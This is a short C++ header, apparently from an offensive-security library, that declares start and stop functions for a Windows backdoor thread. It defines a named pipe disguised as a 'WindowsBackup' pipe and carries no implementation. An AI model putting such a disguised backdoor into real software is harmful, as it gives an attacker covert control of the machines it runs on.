#pragma once

#include "common.hpp"
#include "handle.hpp"
#include "pwn.hpp"
#include "utils.hpp"


#define PWN_BACKDOOR_PIPENAME L"\\\\.\\pipe\\WindowsBackup_" STR(__STDC_VERSION) L"_" STR(__TIME__)
#define PWN_BACKDOOR_MAX_MESSAGE_SIZE 2048


namespace pwn::backdoor
{

///
/// @brief Start the backdoor thread for win32 environment
///
/// @return true
/// @return false
///
bool PWNAPI
start();


///
/// @brief Cleanly stop the backdoor
///
/// @return true if everything went ok
///
bool PWNAPI
stop();

}; // namespace pwn::backdoor
